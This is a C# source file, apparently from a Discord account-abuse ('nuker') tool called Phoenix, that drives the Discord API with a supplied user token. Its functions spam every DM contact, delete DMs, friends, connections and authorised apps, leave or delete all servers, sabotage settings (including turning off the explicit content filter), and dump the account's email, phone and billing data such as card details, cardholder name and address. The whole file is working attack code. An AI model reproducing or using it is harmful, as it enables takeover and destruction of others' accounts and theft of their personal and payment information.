using Newtonsoft.Json.Linq;
using Console = Colorful.Console;
using System.Drawing;
using static Phoenix.API.Config;

namespace Phoenix.API
{
    public class User
    {
        public static void MassDM(string? token, string message)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.Send("/users/@me/channels", "GET", token);
                var array = JArray.Parse(request);
                foreach (dynamic entry in array)
                {
                    Request.Send($"/channels/{entry.id}/messages", "POST", token, $"{{\"content\":\"{message}\"}}");
                    Console.WriteLine($"Messaged: {entry.recipients[0].username}#{entry.recipients[0].discriminator}", Color.Lime);
                    Sleep(Wait.Short);
                }
            }
            catch (Exception e) { Console.WriteLine($"Failed: {e.Message}", Color.Red); Sleep(Wait.Long); }
        }

        public static void DeleteDMs(string? token)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.Send("/users/@me/channels", "GET", token);
                var array = JArray.Parse(request);
                foreach (dynamic entry in array)
                {
                    Request.Send($"/channels/{entry.id}", "DELETE", token);
                    Console.WriteLine($"Deleted: {entry.recipients[0].username}#{entry.recipients[0].discriminator}", Color.Lime);
                    Sleep(Wait.Short);
                }
            }
            catch (Exception e) { Console.WriteLine($"Failed: {e.Message}", Color.Red); Sleep(Wait.Long); }
        }

        public static void UserInformation(string? token)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.Send("/users/@me", "GET", token);
                var id = JObject.Parse(request)["id"];
                var id2 = id == null || string.IsNullOrEmpty(id.ToString()) ? "" : id.ToString();
                var getbadges = JObject.Parse(request)["flags"];
                var getbadges2 = getbadges == null || string.IsNullOrEmpty(getbadges.ToString()) ? "" : getbadges.ToString();
                string badges = "";
                switch (getbadges2)
                {
                    case "1":
                        badges += "Discord Employee, ";
                        break;
                    case "2":
                        badges += "Partnered Guild Owner, ";
                        break;
                    case "4":
                        badges += "HypeSquad Events Member, ";
                        break;
                    case "8":
                        badges += "Bug Hunter Level 1, ";
                        break;
                    case "64":
                        badges += "House Bravery Member, ";
                        break;
                    case "128":
                        badges += "House Brilliance Member, ";
                        break;
                    case "256":
                        badges += "House Balance Member, ";
                        break;
                    case "512":
                        badges += "Early Nitro Supporter, ";
                        break;
                    case "16384":
                        badges += "Bug Hunter Level 2, ";
                        break;
                    case "131072":
                        badges += "Early Verified Bot Developer, ";
                        break;
                }
                badges = badges.TrimEnd(' ', ',');
                var email = JObject.Parse(request)["email"];
                var phone = JObject.Parse(request)["phone"];
                var bio = JObject.Parse(request)["bio"];
                var locale = JObject.Parse(request)["locale"];
                var nsfw = JObject.Parse(request)["nsfw_allowed"];
                var mfa = JObject.Parse(request)["mfa_enabled"];
                var avatarid = JObject.Parse(request)["avatar"];
                var avatarid2 = avatarid == null || string.IsNullOrEmpty(avatarid.ToString()) ? "" : avatarid.ToString();
                string avatar;
                if (string.IsNullOrEmpty(avatarid2))
                    avatar = "N/A";
                else
                    avatar = $"https://cdn.discordapp.com/avatars/{id}/{avatarid}.webp";
                var request2 = Request.Send("/users/@me/settings", "GET", token);
                var theme = JObject.Parse(request2)["theme"];
                var devmode = JObject.Parse(request2)["developer_mode"];
                var status = JObject.Parse(request2)["status"];

                Console.ForegroundColor = Color.Yellow;
                Console.WriteLine("User Information:\n");
                Console.WriteLine($"User ID: {id}\nEmail: {email}\nPhone Number: {phone}\nBiography: {bio}\nLocale: {locale}\nNSFW Allowed: {nsfw}\n2FA Enabled: {mfa}\nBadges: {badges}\nTheme: {theme}\nDeveloper Mode: {devmode}\nStatus: {status}\nAvatar: {avatar}");

                if (Request.Send("/users/@me/billing/payment-sources", "GET", token).Length > 2)
                {
                    Console.WriteLine("\nBilling Information:\n");
                    var request3 = Request.Send("/users/@me/billing/payment-sources", "GET", token);
                    var array = JArray.Parse(request3);
                    foreach (dynamic entry in array)
                    {
                        if (entry.type == "1")
                        {
                            var invalid = entry.invalid;
                            var brand = entry.brand;
                            var last4 = entry.last_4;
                            var expiresmonth = entry.expires_month;
                            var expiresyear = entry.expires_year;
                            var name = entry.billing_address["name"];
                            var address1 = entry.billing_address["line_1"];
                            var address2 = entry.billing_address["line_2"];
                            var city = entry.billing_address["city"];
                            var state = entry.billing_address["state"];
                            var country = entry.billing_address["country"];
                            var postalcode = entry.billing_address["postal_code"];
                            Console.WriteLine($"Type: Credit Card\nInvalid: {invalid}\nBrand: {brand}\nExpiration Date: {expiresmonth}/{expiresyear}\nCardholder Name: {name}\nLast 4 Digits: {last4}\nAddress 1: {address1}\nAddress 2: {address2}\nCity: {city}\nState: {state}\nCountry: {country}\nPostal Code: {postalcode}");
                        }
                        else if (entry.type == "2")
                        {
                            var invalid = entry.invalid;
                            var name = entry.billing_address["name"];
                            var ppemail = entry.email;
                            var address1 = entry.billing_address["line_1"];
                            var address2 = entry.billing_address["line_2"];
                            var city = entry.billing_address["city"];
                            var state = entry.billing_address["state"];
                            var country = entry.billing_address["country"];
                            var postalcode = entry.billing_address["postal_code"];
                            Console.WriteLine($"Type: PayPal\nInvalid: {invalid}\nName: {name}\nEmail: {ppemail}\nAddress 1: {address1}\nAddress 2: {address2}\nCity: {city}\nState: {state}\nCountry: {country}\nPostal Code: {postalcode}");
                        }
                    }
                }
                Console.WriteLine("\nPress any key to go back.");
                Console.ReadKey();
            }
            catch (Exception e) { Console.WriteLine($"Failed: {e.Message}", Color.Red); Sleep(Wait.Long); }
        }

        public static void ConfuseMode(string? token)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                Request.Send("/users/@me/settings", "PATCH", token, $"{{\"locale\": \"zh-CN\",\"theme\": \"light\", \"developer_mode\": \"false\", \"message_display_compact\": \"true\", \"explicit_content_filter\": \"0\"}}");
                Sleep(Wait.Short);
            }
            catch (Exception e) { Console.WriteLine($"Failed: {e.Message}", Color.Red); Sleep(Wait.Long); }
        }

        public static void ChangeTheme(string? token, string theme)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                Request.Send("/users/@me/settings", "PATCH", token, $"{{\"theme\": \"{theme}\"}}");
                Sleep(Wait.Short);
            }
            catch { }
        }

        public static void CreateGuild(string? token, string name)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                Request.Send("/guilds", "POST", token, $"{{\"name\": \"{name}\"}}");
                Sleep(Wait.Short);
            }
            catch (Exception e) { Console.WriteLine($"Failed: {e.Message}", Color.Red); Sleep(Wait.Long); }
        }

        public static void RemoveConnections(string? token)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.Send("/users/@me/connections", "GET", token);
                var array = JArray.Parse(request);
                foreach (dynamic entry in array)
                {
                    Request.Send($"/users/@me/connections/{entry.type}/{entry.id}", "DELETE", token);
                    Console.WriteLine($"Removed: {entry.type}", Color.Lime);
                    Sleep(Wait.Short);
                }
            }
            catch (Exception e) { Console.WriteLine($"Failed: {e.Message}", Color.Red); Sleep(Wait.Long); }
        }

        public static void DeauthorizeApps(string? token)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.Send("/oauth2/tokens", "GET", token);
                var array = JArray.Parse(request);
                foreach (dynamic entry in array)
                {
                    Request.Send($"/oauth2/tokens/{entry.id}", "DELETE", token);
                    Console.WriteLine("Removed: " + entry.application["name"], Color.Lime);
                    Sleep(Wait.Short);
                }
            }
            catch (Exception e) { Console.WriteLine($"Failed: {e.Message}", Color.Red); Sleep(Wait.Long); }
        }

        public static void LeaveHypeSquad(string? token)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                Request.Send("/hypesquad/online", "DELETE", token);
            }
            catch (Exception e) { Console.WriteLine($"Failed: {e.Message}", Color.Red); Sleep(Wait.Long); }
        }

        public static void ClearRelationships(string? token)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.Send("/users/@me/relationships", "GET", token);
                var array = JArray.Parse(request);
                foreach (dynamic entry in array)
                {
                    Request.Send($"/users/@me/relationships/{entry.id}", "DELETE", token);
                    Console.WriteLine($"Removed: {entry.user.username}#{entry.user.discriminator}", Color.Lime);
                    Sleep(Wait.Short);
                }
            }
            catch (Exception e) { Console.WriteLine($"Failed: {e.Message}", Color.Red); Sleep(Wait.Long); }
        }

        public static void LeaveDeleteGuilds(string? token)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.Send("/users/@me/guilds", "GET", token);
                var array = JArray.Parse(request);
                foreach (dynamic entry in array)
                {
                    if (entry.owner == true)
                    {
                        Request.Send($"/guilds/{entry.id}", "DELETE", token);
                        Console.WriteLine($"Deleted: {entry.name}", Color.Lime);
                    }
                    else
                    {
                        Request.Send($"/users/@me/guilds/{entry.id}", "DELETE", token);
                        Console.WriteLine($"Left: {entry.name}", Color.Lime);
                    }
                }
            }
            catch (Exception e) { Console.WriteLine($"Failed: {e.Message}", Color.Red); Sleep(Wait.Long); }
        }

        public static void ChangeHypeSquad(string? token, string? hypesquad)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                switch (hypesquad)
                {
                    case "0":
                        Request.Send("/hypesquad/online", "DELETE", token);
                        break;
                    case "1":
                        Request.Send("/hypesquad/online", "POST", token, $"{{\"house_id\": 1}}");
                        break;
                    case "2":
                        Request.Send("/hypesquad/online", "POST", token, $"{{\"house_id\": 2}}");
                        break;
                    case "3":
                        Request.Send("/hypesquad/online", "POST", token, $"{{\"house_id\": 3}}");
                        break;
                }
                Sleep(Wait.Short);
            }
            catch (Exception e) { Console.WriteLine($"Failed: {e.Message}", Color.Red); Sleep(Wait.Long); }
        }

        public static void ChangeStatus(string? token, string? status)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                Request.Send("/users/@me/settings", "PATCH", token, $"{{\"custom_status\": {{\"text\": \"{status}\"}}}}");
                Sleep(Wait.Short);
            }
            catch (Exception e) { Console.WriteLine($"Failed: {e.Message}", Color.Red); Sleep(Wait.Long); }
        }
    }
}
